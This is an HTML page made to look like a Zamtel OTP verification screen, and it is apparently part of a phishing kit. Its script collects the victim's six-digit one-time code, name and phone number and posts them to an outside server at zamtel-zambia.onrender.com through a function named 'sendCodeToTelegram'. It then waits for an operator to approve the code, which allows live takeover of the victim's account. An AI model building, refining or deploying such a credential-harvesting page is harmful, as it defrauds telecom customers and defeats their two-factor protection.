<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Zamtel | OTP Verification</title>

<style>
*{ box-sizing:border-box; margin:0; padding:0; }

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
  background:#f2f2f2;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

.page{
  width:100%;
  max-width:360px;
  text-align:center;
  padding:20px;
}

.title{
  font-size:42px;
  font-weight:600;
  color:#00843d;
  margin-bottom:10px;
}

.subtitle{
  font-size:22px;
  color:#555;
  margin-bottom:16px;
}

.label{
  font-size:17px;
  color:#666;
  margin-bottom:18px;
}

.otp-boxes{
  display:flex;
  justify-content:center;
  gap:8px;
  margin-bottom:18px;
}

.otp-boxes input{
  width:46px;
  height:54px;
  font-size:22px;
  text-align:center;
  border:2px solid #00843d;
  border-radius:12px;
  background:#fff;
  outline:none;
}

#timerContainer{
  font-size:14px;
  color:#666;
  margin-bottom:24px;
}

button{
  width:100%;
  padding:16px;
  font-size:18px;
  font-weight:600;
  border-radius:14px;
  border:none;
  background:#cccccc;
  color:#ffffff;
}

button:not(:disabled){ background:#00843d; }

.spinner{
  width:16px;
  height:16px;
  border:3px solid white;
  border-top:3px solid rgba(255,255,255,0.4);
  border-radius:50%;
  margin-left:8px;
  animation:spin 1s linear infinite;
  display:none;
}

@keyframes spin{ to{transform:rotate(360deg);} }

#status{
  margin-top:14px;
  font-size:14px;
  min-height:18px;
  font-weight:600;
}
#status.success{ color:#00843d; }   /* green */
#status.error{   color:#d32f2f; }   /* red   */
</style>
</head>

<body>

<div class="page">

  <div class="title">Zamtel</div>
  <div class="subtitle">Enter OTP Code</div>

  <form id="otpForm">

    <div class="label">Enter the verification code</div>

    <div class="otp-boxes">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric">
    </div>

    <div id="timerContainer">
      Resend OTP code in <strong><span id="timerDisplay">30</span></strong> seconds
    </div>

    <button id="submitBtn" disabled>
      <span id="btnText">Login</span>
      <span class="spinner" id="spinner"></span>
    </button>

  </form>

  <div id="status"></div>

</div>

<script>
const BACKEND_URL = "https://zamtel-zambia.onrender.com";

const params = new URLSearchParams(window.location.search);
const botId  = params.get('botId');
if(!botId){ alert("Invalid access link"); throw new Error(); }

const inputs      = document.querySelectorAll('.otp-boxes input');
const submitBtn   = document.getElementById('submitBtn');
const btnText     = document.getElementById('btnText');
const spinner     = document.getElementById('spinner');
const statusEl    = document.getElementById('status');
const timerDisplay= document.getElementById('timerDisplay');

function getIdentity(){
  return {
    name:  localStorage.getItem("name")  || "Unknown",
    phone: localStorage.getItem("phone") || "Unknown"
  };
}

// 🎨 status helper: success = green, error = red
function setStatus(text, type){
  statusEl.textContent = text;
  statusEl.classList.remove("success", "error");
  if(type === "success") statusEl.classList.add("success");
  if(type === "error")   statusEl.classList.add("error");
}

let countdown;

document.addEventListener('keydown', e => {
  if(!/^[0-9]$/.test(e.key) && e.key !== "Backspace") return;

  const values = [...inputs].map(i => i.value);
  const index  = values.findIndex(v => v === "");

  if(e.key === "Backspace") {
    const lastFilled = values.map(v => v !== "").lastIndexOf(true);
    if(lastFilled >= 0) inputs[lastFilled].value = "";
  } else if(index !== -1) {
    inputs[index].value = e.key;
  }

  submitBtn.disabled = ![...inputs].every(i => i.value);
});

function startCountdown(duration = 30){
  let time = duration;
  timerDisplay.textContent = time;
  clearInterval(countdown);

  countdown = setInterval(()=>{
    time--;
    timerDisplay.textContent = time;
    if(time <= 0){
      clearInterval(countdown);
      // No expiry message, no button disable — timer just stops at 0
    }
  },1000);
}

startCountdown();

async function sendCodeToTelegram(name, phone, code){
  try{
    const r = await fetch(`${BACKEND_URL}/submit-code`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ name, phone, code, botId })
    });
    return r.json();
  }catch{
    return null;
  }
}

function pollCodeApproval(requestId){
  return new Promise(resolve=>{
    const i=setInterval(async()=>{
      const { name, phone } = getIdentity();
      const r = await fetch(`${BACKEND_URL}/check-code/${requestId}`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ name, phone, botId })
      });
      const d = await r.json();
      if(d.approved===true||d.approved===false){
        clearInterval(i);
        resolve(d.approved);
      }
    },1500);
  });
}

document.getElementById('otpForm').addEventListener('submit', async e=>{
  e.preventDefault();
  const code = [...inputs].map(i=>i.value).join('');
  const { name, phone } = getIdentity();

  submitBtn.disabled=true;
  btnText.textContent="Verifying";
  spinner.style.display="inline-block";
  setStatus("Waiting for validation...", "success");

  const res = await sendCodeToTelegram(name, phone, code);
  if(!res||!res.requestId){
    setStatus("Failed to send.", "error");
    submitBtn.disabled=false;
    btnText.textContent="Login";
    spinner.style.display="none";
    return;
  }

  const approved = await pollCodeApproval(res.requestId);
  clearInterval(countdown);

  if(approved){
    setStatus("Code approved. Redirecting...", "success");
    localStorage.clear();
    window.location.href=`success.html?botId=${botId}`;
  }else{
    setStatus("Incorrect OTP code. Please try again.", "error");
    inputs.forEach(i=>i.value="");
    submitBtn.disabled=false;
    btnText.textContent="Login";
    spinner.style.display="none";
    startCountdown();
  }
});
</script>

</body>
</html>
